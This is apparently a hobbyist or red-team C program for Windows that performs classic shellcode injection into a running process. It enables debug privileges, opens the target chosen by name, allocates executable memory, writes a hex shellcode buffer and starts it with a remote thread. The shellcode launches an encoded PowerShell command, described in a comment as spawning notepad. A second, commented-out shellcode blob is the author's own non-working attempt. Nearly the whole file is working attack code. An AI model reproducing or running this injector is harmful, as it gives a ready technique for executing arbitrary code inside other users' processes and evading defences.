#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

#define okay(msg, ...) printf("(+) " msg "\n\n", ##__VA_ARGS__)
#define info(msg, ...) printf("(*) " msg "\n\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("(-) " msg "\n\n", ##__VA_ARGS__)

DWORD GetSpecificProcessId(wchar_t * ProcessName);
void EnableDebugPrivileges();

HANDLE hProcess = NULL, hThread = NULL;
DWORD ThreadId = 0;
DWORD ProcessId;
LPVOID rBuffer = NULL;

//my own shellcode ( doesn't work :(((((( )
//unsigned char shell[] = "\x4c\x6f\x61\x64\x4c\x69\x62\x72\x61\x72\x79\x41\x6b\x65\x72\x6e\x65\x6c\x33\x32\x2e\x64\x6c\x6c\x56\x48\x8b\xf4\x48\x83\xe4\xf0\x48\x83\xec\x20\xe8\x05\x48\x8b\xe6\x5e\xc3\x57\x48\x81\xec\x20\x02\xb8\x6b\x66\x89\x84\x24\x90\xb8\x65\x66\x89\x84\x24\x92\xb8\x72\x66\x89\x84\x24\x94\xb8\x6e\x66\x89\x84\x24\x96\xb8\x65\x66\x89\x84\x24\x98\xb8\x6c\x66\x89\x84\x24\x9a\xb8\x33\x66\x89\x84\x24\x9c\xb8\x32\x66\x89\x84\x24\x9e\xb8\x2e\x66\x89\x84\x24\xa0\xb8\x64\x66\x89\x84\x24\xa2\xb8\x6c\x66\x89\x84\x24\xa4\xb8\x6c\x66\x89\x84\x24\xa6\x33\xc0\x66\x89\x84\x24\xa8\xc6\x44\x24\x60\x6b\xc6\x44\x24\x61\x65\xc6\x44\x24\x62\x72\xc6\x44\x24\x63\x6e\xc6\x44\x24\x64\x65\xc6\x44\x24\x65\x6c\xc6\x44\x24\x66\x33\xc6\x44\x24\x67\x32\xc6\x44\x24\x68\x2e\xc6\x44\x24\x69\x64\xc6\x44\x24\x6a\x6c\xc6\x44\x24\x6b\x6c\xc6\x44\x24\x6c\xc6\x44\x24\x50\x4c\xc6\x44\x24\x51\x6f\xc6\x44\x24\x52\x61\xc6\x44\x24\x53\x64\xc6\x44\x24\x54\x4c\xc6\x44\x24\x55\x69\xc6\x44\x24\x56\x62\xc6\x44\x24\x57\x72\xc6\x44\x24\x58\x61\xc6\x44\x24\x59\x72\xc6\x44\x24\x5a\x79\xc6\x44\x24\x5b\x41\xc6\x44\x24\x5c\xc6\x44\x24\x70\x47\xc6\x44\x24\x71\x65\xc6\x44\x24\x72\x74\xc6\x44\x24\x73\x50\xc6\x44\x24\x74\x72\xc6\x44\x24\x75\x6f\xc6\x44\x24\x76\x63\xc6\x44\x24\x77\x41\xc6\x44\x24\x78\x64\xc6\x44\x24\x79\x64\xc6\x44\x24\x7a\x72\xc6\x44\x24\x7b\x65\xc6\x44\x24\x7c\x73\xc6\x44\x24\x7d\x73\xc6\x44\x24\x7e\xc6\x84\x24\x80\x43\xc6\x84\x24\x81\x72\xc6\x84\x24\x82\x65\xc6\x84\x24\x83\x61\xc6\x84\x24\x84\x74\xc6\x84\x24\x85\x65\xc6\x84\x24\x86\x50\xc6\x84\x24\x87\x72\xc6\x84\x24\x88\x6f\xc6\x84\x24\x89\x63\xc6\x84\x24\x8a\x65\xc6\x84\x24\x8b\x73\xc6\x84\x24\x8c\x73\xc6\x84\x24\x8d\x57\xc6\x84\x24\x8e\xb8\x43\x66\x89\x84\x24\xe0\xb8\x3a\x66\x89\x84\x24\xe2\xb8\x5c\x66\x89\x84\x24\xe4\xb8\x57\x66\x89\x84\x24\xe6\xb8\x69\x66\x89\x84\x24\xe8\xb8\x6e\x66\x89\x84\x24\xea\xb8\x64\x66\x89\x84\x24\xec\xb8\x6f\x66\x89\x84\x24\xee\xb8\x77\x66\x89\x84\x24\xf0\xb8\x73\x66\x89\x84\x24\xf2\xb8\x5c\x66\x89\x84\x24\xf4\xb8\x53\x66\x89\x84\x24\xf6\xb8\x79\x66\x89\x84\x24\xf8\xb8\x73\x66\x89\x84\x24\xfa\xb8\x74\x66\x89\x84\x24\xfc\xb8\x65\x66\x89\x84\x24\xfe\xb8\x6d\x66\x89\x84\x24\x01\xb8\x33\x66\x89\x84\x24\x02\x01\xb8\x32\x66\x89\x84\x24\x04\x01\xb8\x5c\x66\x89\x84\x24\x06\x01\xb8\x57\x66\x89\x84\x24\x08\x01\xb8\x69\x66\x89\x84\x24\x0a\x01\xb8\x6e\x66\x89\x84\x24\x0c\x01\xb8\x64\x66\x89\x84\x24\x0e\x01\xb8\x6f\x66\x89\x84\x24\x10\x01\xb8\x77\x66\x89\x84\x24\x12\x01\xb8\x73\x66\x89\x84\x24\x14\x01\xb8\x50\x66\x89\x84\x24\x16\x01\xb8\x6f\x66\x89\x84\x24\x18\x01\xb8\x77\x66\x89\x84\x24\x1a\x01\xb8\x65\x66\x89\x84\x24\x1c\x01\xb8\x72\x66\x89\x84\x24\x1e\x01\xb8\x53\x66\x89\x84\x24\x20\x01\xb8\x68\x66\x89\x84\x24\x22\x01\xb8\x65\x66\x89\x84\x24\x24\x01\xb8\x6c\x66\x89\x84\x24\x26\x01\xb8\x6c\x66\x89\x84\x24\x28\x01\xb8\x5c\x66\x89\x84\x24\x2a\x01\xb8\x76\x66\x89\x84\x24\x2c\x01\xb8\x31\x66\x89\x84\x24\x2e\x01\xb8\x2e\x66\x89\x84\x24\x30\x01\xb8\x30\x66\x89\x84\x24\x32\x01\xb8\x5c\x66\x89\x84\x24\x34\x01\xb8\x70\x66\x89\x84\x24\x36\x01\xb8\x6f\x66\x89\x84\x24\x38\x01\xb8\x77\x66\x89\x84\x24\x3a\x01\xb8\x65\x66\x89\x84\x24\x3c\x01\xb8\x72\x66\x89\x84\x24\x3e\x01\xb8\x73\x66\x89\x84\x24\x40\x01\xb8\x68\x66\x89\x84\x24\x42\x01\xb8\x65\x66\x89\x84\x24\x44\x01\xb8\x6c\x66\x89\x84\x24\x46\x01\xb8\x6c\x66\x89\x84\x24\x48\x01\xb8\x2e\x66\x89\x84\x24\x4a\x01\xb8\x65\x66\x89\x84\x24\x4c\x01\xb8\x78\x66\x89\x84\x24\x4e\x01\xb8\x65\x66\x89\x84\x24\x50\x01\x33\xc0\x66\x89\x84\x24\x52\x01\xb8\x53\x66\x89\x84\x24\xb0\xb8\x74\x66\x89\x84\x24\xb2\xb8\x61\x66\x89\x84\x24\xb4\xb8\x72\x66\x89\x84\x24\xb6\xb8\x74\x66\x89\x84\x24\xb8\xb8\x2d\x66\x89\x84\x24\xba\xb8\x50\x66\x89\x84\x24\xbc\xb8\x72\x66\x89\x84\x24\xbe\xb8\x6f\x66\x89\x84\x24\xc0\xb8\x63\x66\x89\x84\x24\xc2\xb8\x65\x66\x89\x84\x24\xc4\xb8\x73\x66\x89\x84\x24\xc6\xb8\x73\x66\x89\x84\x24\xc8\xb8\x20\x66\x89\x84\x24\xca\xb8\x6e\x66\x89\x84\x24\xcc\xb8\x6f\x66\x89\x84\x24\xce\xb8\x74\x66\x89\x84\x24\xd0\xb8\x65\x66\x89\x84\x24\xd2\xb8\x70\x66\x89\x84\x24\xd4\xb8\x61\x66\x89\x84\x24\xd6\xb8\x64\x66\x89\x84\x24\xd8\x33\xc0\x66\x89\x84\x24\xda\x48\x8d\x84\x24\xb0\x01\x48\x8b\xf8\x33\xc0\xb9\x68\xf3\xaa\x48\x8d\x84\x24\x98\x01\x48\x8b\xf8\x33\xc0\xb9\x18\xf3\xaa\x48\x8d\x8c\x24\x90\xe8\x7e\x03\x48\x89\x84\x24\x60\x01\x48\x83\xbc\x24\x60\x01\x75\x0a\xb8\x01\xe9\x1e\x01\x48\x8d\x54\x24\x50\x48\x8b\x8c\x24\x60\x01\xe8\x15\x01\x48\x89\x84\x24\x68\x01\x48\x83\xbc\x24\x68\x01\x75\x0a\xb8\x02\xe9\xef\x48\x8d\x54\x24\x70\x48\x8b\x8c\x24\x60\x01\xe8\xe6\x48\x89\x84\x24\x70\x01\x48\x83\xbc\x24\x70\x01\x75\x0a\xb8\x03\xe9\xc0\x48\x8b\x84\x24\x68\x01\x48\x89\x84\x24\x80\x01\x48\x8b\x84\x24\x70\x01\x48\x89\x84\x24\x90\x01\x48\x8d\x4c\x24\x60\xff\x94\x24\x80\x01\x48\x89\x84\x24\x88\x01\x48\x8d\x94\x24\x80\x48\x8b\x8c\x24\x88\x01\xff\x94\x24\x90\x01\x48\x89\x84\x24\x78\x01\x48\x83\xbc\x24\x78\x01\x75\x07\xb8\x04\xeb\x5b\x48\x8d\x84\x24\x98\x01\x48\x89\x44\x24\x48\x48\x8d\x84\x24\xb0\x01\x48\x89\x44\x24\x40\x48\xc7\x44\x24\x38\x48\xc7\x44\x24\x30\xc7\x44\x24\x28\x20\xc7\x44\x24\x20\x45\x33\xc9\x45\x33\xc0\x48\x8d\x94\x24\xb0\x48\x8d\x8c\x24\xe0\xff\x94\x24\x78\x01\x33\xc0\x48\x81\xc4\x20\x02\x5f\xc3\x48\x89\x54\x24\x10\x48\x89\x4c\x24\x08\x48\x83\xec\x78\x48\x8b\x84\x24\x80\x48\x89\x44\x24\x30\x48\x8b\x44\x24\x30\x0f\xb7\x3d\x4d\x5a\x74\x07\x33\xc0\xe9\x04\x02\x48\x8b\x44\x24\x30\x48\x63\x40\x3c\x48\x8b\x8c\x24\x80\x48\x03\xc8\x48\x8b\xc1\x48\x89\x44\x24\x40\xb8\x08\x48\x6b\xc0\x48\x8b\x4c\x24\x40\x48\x8d\x84\x01\x88\x48\x89\x44\x24\x38\x48\x8b\x44\x24\x38\x8b\x48\x85\xc0\x75\x07\x33\xc0\xe9\xba\x01\x48\x8b\x44\x24\x38\x8b\x89\x44\x24\x18\x8b\x44\x24\x18\x48\x03\x84\x24\x80\x48\x89\x44\x24\x10\x48\x8b\x44\x24\x10\x8b\x40\x18\x48\x89\x44\x24\x48\x48\x8b\x44\x24\x10\x8b\x40\x1c\x89\x44\x24\x24\x48\x8b\x44\x24\x10\x8b\x40\x20\x89\x44\x24\x1c\x48\x8b\x44\x24\x10\x8b\x40\x24\x89\x44\x24\x20\x48\xc7\x44\x24\x08\xeb\x0d\x48\x8b\x44\x24\x08\x48\xff\xc0\x48\x89\x44\x24\x08\x48\x8b\x44\x24\x48\x48\x39\x44\x24\x08\x0f\x83\x43\x01\x8b\x44\x24\x1c\x48\x8b\x8c\x24\x80\x48\x03\xc8\x48\x8b\xc1\x48\x8b\x4c\x24\x08\x48\x8d\x04\x88\x48\x89\x44\x24\x58\x8b\x44\x24\x20\x48\x8b\x8c\x24\x80\x48\x03\xc8\x48\x8b\xc1\x48\x8b\x4c\x24\x08\x48\x8d\x04\x48\x48\x89\x44\x24\x50\x8b\x44\x24\x24\x48\x8b\x8c\x24\x80\x48\x03\xc8\x48\x8b\xc1\x48\x8b\x4c\x24\x50\x0f\xb7\x09\x48\x8d\x04\x88\x48\x89\x44\x24\x60\x48\x8b\x44\x24\x58\x8b\x48\x8b\x8c\x24\x80\x48\x03\xc8\x48\x8b\xc1\x48\x89\x44\x24\x28\x48\xc7\x04\x24\x48\xc7\x04\x24\xeb\x0b\x48\x8b\x04\x24\x48\xff\xc0\x48\x89\x04\x24\x48\x8b\x04\x24\x48\x8b\x8c\x24\x88\x48\x03\xc8\x48\x8b\xc1\x0f\xbe\x85\xc0\x74\x45\x48\x8b\x04\x24\x48\x8b\x4c\x24\x28\x48\x03\xc8\x48\x8b\xc1\x0f\xbe\x85\xc0\x74\x2f\x48\x8b\x04\x24\x48\x8b\x8c\x24\x88\x48\x03\xc8\x48\x8b\xc1\x0f\xbe\x48\x8b\x0c\x24\x48\x8b\x54\x24\x28\x48\x03\xd1\x48\x8b\xca\x0f\xbe\x09\x3b\xc1\x74\x02\xeb\x02\xeb\x97\x48\x8b\x04\x24\x48\x8b\x8c\x24\x88\x48\x03\xc8\x48\x8b\xc1\x0f\xbe\x85\xc0\x75\x2d\x48\x8b\x04\x24\x48\x8b\x4c\x24\x28\x48\x03\xc8\x48\x8b\xc1\x0f\xbe\x85\xc0\x75\x17\x48\x8b\x44\x24\x60\x8b\x48\x8b\x8c\x24\x80\x48\x03\xc8\x48\x8b\xc1\xeb\x07\xe9\xa0\xfe\xff\xff\x33\xc0\x48\x83\xc4\x78\xc3\x48\x89\x4c\x24\x08\x56\x57\x48\x83\xec\x68\x48\xc7\x44\x24\x30\x65\x48\x8b\x04\x25\x60\x48\x89\x44\x24\x30\x48\x8b\x44\x24\x30\x48\x8b\x40\x18\x48\x89\x44\x24\x38\x48\x8d\x44\x24\x48\x48\x8b\x4c\x24\x38\x48\x8b\xf8\x48\x8d\x71\x10\xb9\x10\xf3\xa4\x48\x8b\x44\x24\x48\x48\x89\x44\x24\x40\x48\x8b\x44\x24\x40\x48\x89\x44\x24\x18\x48\x83\x7c\x24\x18\x0f\x84\xc2\x01\x48\x8b\x44\x24\x18\x48\x83\x78\x30\x0f\x84\xb2\x01\x48\x8b\x44\x24\x18\x48\x83\x78\x60\x75\x02\xeb\xd6\x48\x8b\x44\x24\x18\x48\x8b\x40\x60\x48\x89\x44\x24\x10\x48\xc7\x04\x24\x48\xc7\x04\x24\xeb\x0b\x48\x8b\x04\x24\x48\xff\xc0\x48\x89\x04\x24\x48\x8b\x84\x24\x80\x48\x8b\x0c\x24\x0f\xb7\x04\x48\x85\xc0\x0f\x84\x1f\x01\x48\x8b\x44\x24\x10\x48\x8b\x0c\x24\x0f\xb7\x04\x48\x85\xc0\x0f\x84\x0a\x01\x48\x8b\x84\x24\x80\x48\x8b\x0c\x24\x0f\xb7\x04\x48\x83\xf8\x5a\x7f\x4f\x48\x8b\x84\x24\x80\x48\x8b\x0c\x24\x0f\xb7\x04\x48\x83\xf8\x41\x7c\x3a\x48\x8b\x84\x24\x80\x48\x8b\x0c\x24\x0f\xb7\x04\x48\x83\xe8\x41\x83\xc0\x61\x89\x44\x24\x20\x48\x8b\x84\x24\x80\x48\x8b\x0c\x24\x0f\xb7\x54\x24\x20\x66\x89\x14\x48\x0f\xb7\x44\x24\x20\x89\x44\x24\x24\xeb\x14\x48\x8b\x84\x24\x80\x48\x8b\x0c\x24\x0f\xb7\x04\x48\x89\x44\x24\x24\x0f\xb7\x44\x24\x24\x66\x89\x44\x24\x08\x48\x8b\x44\x24\x10\x48\x8b\x0c\x24\x0f\xb7\x04\x48\x83\xf8\x5a\x7f\x46\x48\x8b\x44\x24\x10\x48\x8b\x0c\x24\x0f\xb7\x04\x48\x83\xf8\x41\x7c\x34\x48\x8b\x44\x24\x10\x48\x8b\x0c\x24\x0f\xb7\x04\x48\x83\xe8\x41\x83\xc0\x61\x89\x44\x24\x28\x48\x8b\x44\x24\x10\x48\x8b\x0c\x24\x0f\xb7\x54\x24\x28\x66\x89\x14\x48\x0f\xb7\x44\x24\x28\x89\x44\x24\x2c\xeb\x11\x48\x8b\x44\x24\x10\x48\x8b\x0c\x24\x0f\xb7\x04\x48\x89\x44\x24\x2c\x0f\xb7\x44\x24\x2c\x66\x89\x44\x24\x0c\x0f\xb7\x44\x24\x08\x0f\xb7\x4c\x24\x0c\x3b\xc1\x74\x02\xeb\x05\xe9\xbe\xfe\xff\xff\x48\x8b\x84\x24\x80\x48\x8b\x0c\x24\x0f\xb7\x04\x48\x85\xc0\x75\x1c\x48\x8b\x44\x24\x10\x48\x8b\x0c\x24\x0f\xb7\x04\x48\x85\xc0\x75\x0b\x48\x8b\x44\x24\x18\x48\x8b\x40\x30\xeb\x14\x48\x8b\x44\x24\x18\x48\x8b\x48\x89\x44\x24\x18\xe9\x32\xfe\xff\xff\x33\xc0\x48\x83\xc4\x68\x5f\x5e\xc3";

//very obfuscated powershell that spawns notepad
unsigned char shell[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79"
"\x73\x74\x65\x6d\x33\x32\x5c\x57\x69\x6e\x64\x6f\x77\x73"
"\x50\x6f\x77\x65\x72\x53\x68\x65\x6c\x6c\x5c\x76\x31\x2e"
"\x30\x5c\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65"
"\x78\x65\x20\x2d\x65\x6e\x63\x20\x63\x41\x42\x76\x41\x48"
"\x63\x41\x5a\x51\x42\x79\x41\x48\x4d\x41\x61\x41\x42\x6c"
"\x41\x47\x77\x41\x62\x41\x41\x67\x41\x43\x30\x41\x5a\x51"
"\x42\x75\x41\x47\x4d\x41\x49\x41\x42\x52\x41\x48\x63\x41"
"\x51\x51\x41\x32\x41\x45\x45\x41\x52\x67\x42\x33\x41\x45"
"\x45\x41\x56\x67\x42\x33\x41\x45\x49\x41\x63\x41\x42\x42"
"\x41\x45\x63\x41\x4e\x41\x42\x42\x41\x46\x6f\x41\x51\x51"
"\x42\x43\x41\x48\x59\x41\x51\x51\x42\x49\x41\x47\x4d\x41"
"\x51\x51\x42\x6a\x41\x48\x63\x41\x51\x67\x42\x6a\x41\x45"
"\x45\x41\x52\x67\x42\x4e\x41\x45\x45\x41\x5a\x51\x42\x52"
"\x41\x45\x49\x41\x65\x67\x42\x42\x41\x45\x67\x41\x55\x51"
"\x42\x42\x41\x46\x6f\x41\x55\x51\x42\x43\x41\x48\x51\x41"
"\x51\x51\x42\x45\x41\x45\x30\x41\x51\x51\x42\x4e\x41\x47"
"\x63\x41\x51\x67\x42\x6a\x41\x45\x45\x41\x52\x67\x42\x6a"
"\x41\x45\x45\x41\x59\x51\x42\x52\x41\x45\x49\x41\x64\x51"
"\x42\x42\x41\x45\x63\x41\x55\x51\x42\x42\x41\x47\x49\x41"
"\x64\x77\x42\x43\x41\x44\x4d\x41\x51\x51\x42\x49\x41\x45"
"\x30\x41\x51\x51\x42\x56\x41\x45\x45\x41\x51\x67\x42\x32"
"\x41\x45\x45\x41\x53\x41\x42\x6a\x41\x45\x45\x41\x57\x67"
"\x42\x52\x41\x45\x49\x41\x65\x51\x42\x42\x41\x45\x59\x41"
"\x54\x51\x42\x42\x41\x47\x45\x41\x51\x51\x42\x43\x41\x47"
"\x77\x41\x51\x51\x42\x48\x41\x48\x63\x41\x51\x51\x42\x69"
"\x41\x45\x45\x41\x51\x67\x42\x6a\x41\x45\x45\x41\x53\x41"
"\x42\x5a\x41\x45\x45\x41\x54\x51\x42\x52\x41\x45\x45\x41"
"\x64\x51\x42\x42\x41\x45\x51\x41\x51\x51\x42\x42\x41\x46"
"\x67\x41\x51\x51\x42\x43\x41\x48\x63\x41\x51\x51\x42\x48"
"\x41\x44\x67\x41\x51\x51\x42\x6b\x41\x48\x63\x41\x51\x67"
"\x42\x73\x41\x45\x45\x41\x53\x41\x42\x4a\x41\x45\x45\x41"
"\x59\x77\x42\x33\x41\x45\x49\x41\x62\x77\x42\x42\x41\x45"
"\x63\x41\x56\x51\x42\x42\x41\x47\x49\x41\x51\x51\x42\x43"
"\x41\x48\x4d\x41\x51\x51\x42\x44\x41\x44\x51\x41\x51\x51"
"\x42\x61\x41\x46\x45\x41\x51\x67\x41\x30\x41\x45\x45\x41"
"\x52\x77\x42\x56\x41\x45\x45\x41\x53\x51\x42\x42\x41\x45"
"\x49\x41\x56\x41\x42\x42\x41\x45\x67\x41\x55\x51\x42\x42"
"\x41\x46\x6b\x41\x55\x51\x42\x43\x41\x48\x6b\x41\x51\x51"
"\x42\x49\x41\x46\x45\x41\x51\x51\x42\x4d\x41\x46\x45\x41"
"\x51\x67\x42\x52\x41\x45\x45\x41\x53\x41\x42\x4a\x41\x45"
"\x45\x41\x59\x67\x42\x33\x41\x45\x49\x41\x61\x67\x42\x42"
"\x41\x45\x63\x41\x56\x51\x42\x42\x41\x47\x4d\x41\x64\x77"
"\x42\x43\x41\x48\x6f\x41\x51\x51\x42\x44\x41\x45\x45\x41"
"\x51\x51\x42\x69\x41\x47\x63\x41\x51\x67\x42\x32\x41\x45"
"\x45\x41\x53\x41\x42\x52\x41\x45\x45\x41\x57\x67\x42\x52"
"\x41\x45\x49\x41\x64\x77\x42\x42\x41\x45\x63\x41\x52\x51"
"\x42\x42\x41\x46\x6f\x41\x51\x51\x42\x42\x41\x44\x30\x41"
"\x00";

int wmain(void){
    wchar_t ProcName[20];

    printf("==========================================\n\n");
    printf("Process Name: ");

    if(wscanf(L"%s", ProcName) < 1){
        warn("error reading input, error: %ld", GetLastError());
        return EXIT_FAILURE;
    }

    printf("\n==========================================\n\n");

    ProcessId = GetSpecificProcessId(ProcName);

    if(ProcessId < 0){
        warn("failed to find %ls, error: %ld", ProcName, GetLastError());
        return EXIT_FAILURE;
    }
    else if(ProcessId == -1){
        warn("something went wrong, error: %ld", GetLastError());
        return EXIT_FAILURE;
    }

    okay("successfully found %ls with pid: %d", ProcName, ProcessId);

    EnableDebugPrivileges();

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);

    if(hProcess == INVALID_HANDLE_VALUE){
        warn("failed to open %ls, error: %ld", ProcName, GetLastError());
        return EXIT_FAILURE;
    }

    okay("sucessfully retrieved handle for %ls: ---%p", ProcName, hProcess);

    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shell), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    if(rBuffer == NULL){
        warn("memory couldn't be allocated, error: %ld", GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    okay("sucessfully allocated memory of size %zu with RWX permissions", sizeof(shell));

    if(!WriteProcessMemory(
        hProcess,
        rBuffer,
        shell,
        sizeof(shell),
        NULL
    )){
        warn("failed to write to memory, error: %ld", GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    okay("wrote %zu bytes to process memory", sizeof(shell));

    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, rBuffer, NULL, 0, 0, &ThreadId);

    if(hThread == INVALID_HANDLE_VALUE){
        warn("could not grab thread handle, error: ", GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    okay("sucessfully grabbed handle for thread %ld: ---%p", ThreadId, hThread);

    //using INFINITE here is bad practice, this is only for the testing portion
    info("beginning thread execution.");
    WaitForSingleObject(hThread, INFINITE);
    okay("thread %ld execution has stopped", ThreadId);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;
}

//this grabs just the first instance that it can find
DWORD GetSpecificProcessId(wchar_t * ProcessName){
    size_t IdSize = 1;
    DWORD * peID = (DWORD *) calloc(IdSize, sizeof(DWORD));
    int index = 0;
    peID[0] = -1;
    PROCESSENTRY32 ProcEntry;
    ProcEntry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS , 0 );

    if(hProcessSnap == INVALID_HANDLE_VALUE){
        warn("failed to take snapshot of processes, error: %ld", GetLastError());
        free(peID);
        return -1;
    }

    if(!Process32FirstW(hProcessSnap, &ProcEntry)){
        warn("failed to grab first process in the snapshot, error: %ld", GetLastError());
        free(peID);
        CloseHandle(hProcessSnap);
        return -1;
    }

    if(wcscmp(ProcEntry.szExeFile, ProcessName) == 0){
        peID[index++] = ProcEntry.th32ProcessID;
        IdSize++;
        peID = realloc(peID, sizeof(DWORD) * IdSize);
    }

    while(Process32NextW(hProcessSnap, &ProcEntry)){
        if(wcscmp(ProcEntry.szExeFile, ProcessName) == 0){
            peID[index++] = ProcEntry.th32ProcessID;
            IdSize++;
            peID = realloc(peID, sizeof(DWORD) * IdSize);
        }
    }

    DWORD ret = peID[0];

    free(peID);
    CloseHandle(hProcessSnap);

    return ret;
}

void EnableDebugPrivileges(){
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkp;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);

    CloseHandle(hToken);
}